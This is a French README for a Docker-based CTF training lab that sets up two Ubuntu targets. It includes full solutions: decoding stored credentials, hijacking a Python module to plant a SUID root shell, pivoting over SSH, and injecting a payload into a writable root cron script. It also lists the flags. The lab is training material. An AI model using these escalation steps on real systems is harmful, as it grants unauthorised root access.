# 🔐 CTF Lab — Multi-Machine Privilege Escalation

Lab de cybersécurité basé sur Docker Compose simulant une infrastructure d'entreprise avec segmentation réseau et challenges d'escalade de privilèges.

---

## 📋 Table des matières

- [Vue d'ensemble](#vue-densemble)
- [Architecture](#architecture)
- [Prérequis](#prérequis)
- [Installation](#installation)
- [Démarrage](#démarrage)
- [Challenges](#challenges)
  - [Machine 1 — Python Module Hijacking](#machine-1--python-module-hijacking)
  - [Machine 2 — Cron Privilege Escalation](#machine-2--cron-privilege-escalation)
- [Topologie réseau](#topologie-réseau)
- [Flags](#flags)
- [Solutions](#solutions)
- [Troubleshooting](#troubleshooting)
- [Nettoyage](#nettoyage)

---

## 🎯 Vue d'ensemble

Ce lab CTF propose un scénario réaliste de pentest interne où l'attaquant doit :

1. **Compromettre Machine 1** (accessible depuis le réseau front)
2. **Escalader ses privilèges** sur M1 via une vulnérabilité Python
3. **Pivoter vers Machine 2** (réseau interne isolé)
4. **Escalader ses privilèges** sur M2 via une mauvaise configuration de cron

### Compétences travaillées

- 🔍 **Reconnaissance** — énumération système, analyse de logs
- 🔑 **Credential harvesting** — extraction et décodage de secrets
- 🐍 **Python module hijacking** — exploitation de PYTHONPATH mal configuré
- 🔄 **Pivoting SSH** — mouvement latéral entre réseaux segmentés
- ⏰ **Cron exploitation** — abus de tâches planifiées root
- 🛡️ **SUID binaries** — création et exploitation de binaires setuid

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      RÉSEAU FRONT                           │
│                    (172.18.0.0/16)                          │
│                                                             │
│  ┌──────────────┐                    ┌──────────────┐      │
│  │              │                    │              │      │
│  │   Kali       │◄──────SSH─────────►│  Machine 1   │      │
│  │  Attaquant   │    player:pass     │   (target1)  │      │
│  │              │                    │              │      │
│  └──────────────┘                    └───────┬──────┘      │
│   172.18.0.2                                 │             │
│                                              │             │
└──────────────────────────────────────────────┼─────────────┘
                                               │
                                               │ SSH pivot
                                               │ (clé root)
                                               │
┌──────────────────────────────────────────────┼─────────────┐
│                   RÉSEAU INTERNAL            │             │
│                   (172.19.0.0/16)            │             │
│                     (isolé)                  │             │
│                                              │             │
│                                    ┌─────────▼──────┐      │
│                                    │                │      │
│                                    │   Machine 2    │      │
│                                    │   (target2)    │      │
│                                    │                │      │
│                                    └────────────────┘      │
│                                       172.19.0.2           │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

### Machines

| Machine | Hostname | IP (front) | IP (internal) | OS | Rôle |
|---------|----------|------------|---------------|-----|------|
| **Attaquant** | lab-attaquant | 172.18.0.2 | — | Kali Linux | Point d'entrée |
| **Machine 1** | target1 / lab-m1 | 172.18.0.3 | 172.19.0.3 | Ubuntu 24.04 | Cible primaire + pivot |
| **Machine 2** | target2 / lab-m2 | — | 172.19.0.2 | Ubuntu 24.04 | Cible interne |

---

## ⚙️ Prérequis

- **Docker** (v20.10+)
- **Docker Compose** (v2.0+)
- 2 GB RAM minimum
- 5 GB d'espace disque

Vérification :
```bash
docker --version
docker compose version
```

---

## 📦 Installation

```bash
# Cloner le repository
git clone <votre-repo>
cd lab

# Vérifier la structure
tree -L 2
```

**Structure attendue** :
```
lab/
├── attaquant/
│   └── Dockerfile
├── machine2/
│   ├── files/
│   │   ├── entrypoint.sh
│   │   ├── root_cron.sh
│   │   └── m1_id_ed25519.pub
│   └── Dockerfile
├── privesc-advanced/
│   └── files/
│       ├── backup.sh
│       ├── backup.py
│       ├── utils.py
│       ├── entrypoint-m1.sh
│       ├── m1_id_ed25519
│       └── m1_id_ed25519.pub
├── workspace/              (dossier partagé Kali ↔ hôte)
├── docker-compose.yaml
├── Dockerfile              (Machine 1)
└── README.md
```

---

## 🚀 Démarrage

### Lancement du lab

```bash
# Démarrer l'infrastructure complète
docker compose up --build -d

# Vérifier que tous les containers sont Up
docker ps
```

**Sortie attendue** :
```
CONTAINER ID   IMAGE           STATUS         PORTS      NAMES
xxxxx          lab-attaquant   Up X seconds              lab-attaquant
xxxxx          lab-machine1    Up X seconds   22/tcp     lab-m1
xxxxx          lab-machine2    Up X seconds   22/tcp     lab-m2
```

### Accès à la machine attaquante

```bash
# Entrer dans Kali
docker exec -it lab-attaquant bash

# Vérifier la connectivité vers M1
ping -c 3 machine1

# Se connecter en SSH à M1
ssh player@machine1
# Mot de passe : player123
```

### Commandes utiles

```bash
# Voir les logs d'un container
docker logs lab-m1

# Redémarrer un container spécifique
docker restart lab-m1

# Entrer directement dans M1 (bypass SSH)
docker exec -it lab-m1 bash

# Arrêter le lab
docker compose down

# Tout supprimer (containers + réseaux + volumes)
docker compose down --volumes --remove-orphans
```

---

## 🎮 Challenges

### Machine 1 — Python Module Hijacking

**Niveau** : Moyen  
**Objectifs** :
- Obtenir le flag user (`/home/player/user.txt`)
- Escalader vers `ops`
- Escalader vers `root` et obtenir `/root/root.txt`

#### 🔍 Reconnaissance

En tant que `player`, énumérer le système :

```bash
# Identifier les utilisateurs
cat /etc/passwd | grep -E "player|ops"

# Chercher des fichiers intéressants
ls -la /opt/
ls -la /var/log/app/

# Lire les logs applicatifs
cat /var/log/app/app.log
```

**Indice trouvé dans les logs** :
```
[WARN] File: /opt/app/.passwd (TODO: remove before production)
```

#### 🔑 Extraction de credentials

```bash
# Lire le fichier .passwd
cat /opt/app/.passwd
# Output : b3BzOnYzcnlTdHIwbmdPcHNQQHNzIQ==

# Décoder base64
echo "b3BzOnYzcnlTdHIwbmdPcHNQQHNzIQ==" | base64 -d
# Output : ops:v3ryStr0ngOpsP@ss!
```

#### 🔄 Mouvement latéral (player → ops)

```bash
su - ops
# Mot de passe : v3ryStr0ngOpsP@ss!
```

#### 🐍 Escalade de privilèges (ops → root)

**Découverte de la vulnérabilité** :

```bash
# Vérifier les droits sudo
sudo -l
# Output : (root) NOPASSWD: /usr/local/bin/backup.sh

# Analyser le script backup
cat /usr/local/bin/backup.sh
```

**Contenu de `backup.sh`** :
```bash
cd /var/backup/run
PYTHONPATH="/var/backup/run:/opt/backup" \
    /usr/bin/python3 -c "import backup; backup.main()"
```

**Analyse** :
- Le script change de répertoire vers `/var/backup/run` (writable par ops)
- `PYTHONPATH` met `/var/backup/run` en **premier** dans la résolution des imports
- Python charge `backup.py` qui importe `utils`

**Vérification des permissions** :

```bash
ls -la /var/backup/run
# drwxrwxr-x ops ops → on peut écrire ici !

ls -la /opt/backup/
# -rw-r--r-- root root utils.py → module légitime
```

**Exploitation — Python Module Hijacking** :

```bash
# Créer un faux module utils.py dans /var/backup/run
cat > /var/backup/run/utils.py << 'EOF'
import os

def log(msg):
    pass

def do_backup():
    os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
    return True
EOF

# Déclencher le backup en root
sudo /usr/local/bin/backup.sh

# Vérifier que le SUID bash a été créé
ls -la /tmp/rootbash
# -rwsr-xr-x root root

# Lancer le shell root
/tmp/rootbash -p

# Vérifier l'escalade
whoami
# root

# Obtenir le flag root
cat /root/root.txt
```

**Explication technique** :

Quand Python exécute `import utils` depuis `/var/backup/run`, il cherche dans l'ordre de `sys.path` :
1. `/var/backup/run` (via PYTHONPATH) → **trouve notre faux utils.py**
2. `/opt/backup` (jamais atteint)

Notre `utils.py` malveillant est chargé et exécuté avec les privilèges root, créant un bash SUID.

---

### Machine 2 — Cron Privilege Escalation

**Niveau** : Facile à Moyen  
**Prérequis** : Shell root sur Machine 1

#### 🔄 Pivot SSH (M1 → M2)

Depuis le shell root de M1 :

```bash
# Vérifier la présence de la clé SSH
ls -la /root/.ssh/
# -rw------- root root id_ed25519

# Se connecter à M2 en tant que dev
ssh -i /root/.ssh/id_ed25519 dev@machine2
# ou
ssh -i /root/.ssh/id_ed25519 dev@lab-m2

# Arrivée sur M2 en tant que dev
whoami
# dev
```

#### 🔍 Reconnaissance sur M2

```bash
# Flag user
cat ~/user.txt

# Chercher des indices
ls -la ~
ls -la /opt/

# Analyser les processus
ps aux

# Vérifier les cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
```

**Découverte** :
```bash
cat /etc/cron.d/maint
# * * * * * root /opt/maint/root_cron.sh >/dev/null 2>&1
```

#### ⏰ Exploitation du cron

```bash
# Vérifier les permissions du script cron
ls -la /opt/maint/root_cron.sh
# -rwxrwxr-x dev dev → writable !

# Injecter un payload
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/maint/root_cron.sh

# Attendre l'exécution (max 1 minute)
sleep 60

# Vérifier la création du SUID bash
ls -la /tmp/rootbash
# -rwsr-xr-x root root

# Shell root
/tmp/rootbash -p

# Flag root
cat /root/root.txt
```

---

## 🌐 Topologie réseau

### Réseaux Docker

| Réseau | Subnet | Propriété | Usage |
|--------|--------|-----------|-------|
| `lab_front` | 172.18.0.0/16 | bridge public | Attaquant ↔ M1 |
| `lab_internal` | 172.19.0.0/16 | bridge isolé | M1 ↔ M2 (pas d'internet) |

### Règles de connectivité

✅ **Autorisé** :
- Kali → M1 (SSH port 22)
- M1 → M2 (SSH port 22, clé privée root)

❌ **Bloqué** :
- Kali → M2 (segmentation réseau)
- M2 → Internet (réseau internal isolé)

### Test de segmentation

Depuis Kali :
```bash
ping machine1    # ✅ fonctionne
ping machine2    # ❌ échoue (Temporary failure in name resolution)
```

Depuis M1 :
```bash
ping machine2    # ✅ fonctionne
```

---

## 🚩 Flags

| Flag | Emplacement | Permissions | Comment l'obtenir |
|------|-------------|-------------|-------------------|
| `FLAG{user_recon_first}` | `/home/player/user.txt` | `640 player:player` | Accès initial M1 |
| `FLAG{root_owned_backup_chain}` | `/root/root.txt` (M1) | `600 root:root` | Escalade root M1 |
| `FLAG{m2_user}` | `/home/dev/user.txt` | `640 dev:dev` | Pivot SSH vers M2 |
| `FLAG{m2_root}` | `/root/root.txt` (M2) | `600 root:root` | Escalade root M2 |

---

## 💡 Solutions

### Résumé de l'attaque complète

```bash
# ═══════════════════════════════════════════════════════════
# PHASE 1 — Accès initial M1
# ═══════════════════════════════════════════════════════════
docker exec -it lab-attaquant bash
ssh player@machine1    # player123

# ═══════════════════════════════════════════════════════════
# PHASE 2 — Reconnaissance M1
# ═══════════════════════════════════════════════════════════
cat user.txt                              # FLAG 1
cat /var/log/app/app.log
cat /opt/app/.passwd
echo "b3BzOnYzcnlTdHIwbmdPcHNQQHNzIQ==" | base64 -d

# ═══════════════════════════════════════════════════════════
# PHASE 3 — Escalade M1 (player → ops → root)
# ═══════════════════════════════════════════════════════════
su - ops                                  # v3ryStr0ngOpsP@ss!
sudo -l
cat > /var/backup/run/utils.py << 'EOF'
import os
def log(msg): pass
def do_backup():
    os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
    return True
EOF
sudo /usr/local/bin/backup.sh
/tmp/rootbash -p
cat /root/root.txt                        # FLAG 2

# ═══════════════════════════════════════════════════════════
# PHASE 4 — Pivot M1 → M2
# ═══════════════════════════════════════════════════════════
ssh -i /root/.ssh/id_ed25519 dev@machine2

# ═══════════════════════════════════════════════════════════
# PHASE 5 — Escalade M2 (dev → root)
# ═══════════════════════════════════════════════════════════
cat user.txt                              # FLAG 3
cat /etc/cron.d/maint
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/maint/root_cron.sh
sleep 60
/tmp/rootbash -p
cat /root/root.txt                        # FLAG 4
```

---

## 🛠️ Troubleshooting

### Le container M1 s'arrête immédiatement

**Symptôme** :
```bash
docker ps -a
# lab-m1   Exited (0)
```

**Cause** : `CMD ["/bin/bash"]` sans terminal quitte immédiatement.

**Solution** : Vérifier que le Dockerfile M1 finit par :
```dockerfile
CMD ["/entrypoint.sh"]
```

Et non pas :
```dockerfile
CMD ["/bin/bash"]
```

---

### SSH refuse la connexion vers M1

**Symptôme** :
```bash
ssh player@machine1
# Connection refused
```

**Diagnostic** :
```bash
docker logs lab-m1
# Si : "/usr/sbin/sshd: No such file or directory"
```

**Cause** : `openssh-server` pas installé.

**Solution** : Vérifier dans le Dockerfile M1 :
```dockerfile
RUN apt-get update && apt-get install -y \
    ... openssh-server ...
```

---

### Kali ne résout pas machine1

**Symptôme** :
```bash
ping machine1
# Temporary failure in name resolution
```

**Diagnostic** :
```bash
cat /etc/resolv.conf
# Vérifier que nameserver 127.0.0.11 est présent
```

**Solution** : Ajouter dans `docker-compose.yaml` :
```yaml
attaquant:
  dns:
    - 127.0.0.11
  dns_search:
    - lab
```

---

### M1 et Kali sur des sous-réseaux différents

**Symptôme** :
```bash
nslookup machine1
# Address: 172.18.0.3

docker exec -it lab-attaquant ip a
# inet 172.19.0.2/16  ← différent !
```

**Cause** : Réseaux Docker orphelins.

**Solution** :
```bash
docker compose down --volumes --remove-orphans
docker network prune -f
docker compose up --build -d
```

---

### Python Module Hijacking ne fonctionne pas

**Symptôme** : Le vrai `utils.py` est toujours chargé.

**Cause** : Le script shell utilise `python3 /opt/backup/backup.py` au lieu de `python3 -c`.

**Solution** : Vérifier que `backup.sh` contient :
```bash
PYTHONPATH="/var/backup/run:/opt/backup" \
    /usr/bin/python3 -c "import backup; backup.main()"
```

Et **pas** :
```bash
python3 /opt/backup/backup.py
```

---

## 🧹 Nettoyage

### Arrêt propre

```bash
# Arrêter tous les containers
docker compose down

# Supprimer aussi les volumes
docker compose down --volumes

# Supprimer les réseaux orphelins
docker network prune -f
```

### Nettoyage complet

```bash
# Supprimer toutes les images du lab
docker rmi lab-attaquant lab-machine1 lab-machine2

# Nettoyer les layers de build
docker builder prune -a -f

# Supprimer les containers arrêtés
docker container prune -f
```

---

## 📚 Ressources

### Techniques abordées

- **MITRE ATT&CK** :
  - T1078 — Valid Accounts
  - T1068 — Exploitation for Privilege Escalation
  - T1053.003 — Scheduled Task/Job: Cron
  - T1574.006 — Hijack Execution Flow: Dynamic Linker Hijacking

- **OWASP** :
  - Hardcoded Credentials
  - Insecure File Permissions
  - Privilege Escalation

### Lectures recommandées

- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [GTFOBins — SUID Binaries](https://gtfobins.github.io/)
- [Python Module Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

---

## 📝 Notes

### Sécurité

⚠️ **Ce lab est destiné uniquement à l'apprentissage dans un environnement contrôlé.**

Les vulnérabilités sont **volontairement** introduites et ne doivent **jamais** être reproduites en production :
- Credentials en clair dans les fichiers
- Scripts writable par des utilisateurs non-privilégiés
- PYTHONPATH mal configuré
- Absence de validation des chemins

### Modifications

Pour adapter le lab :
- **Changer les mots de passe** : éditer les `RUN echo "user:pass" | chpasswd` dans les Dockerfiles
- **Ajouter des challenges** : créer de nouveaux scripts dans `privesc-advanced/files/`
- **Modifier la topologie** : ajouter des réseaux dans `docker-compose.yaml`

---


**Bon hack ! 🎉**
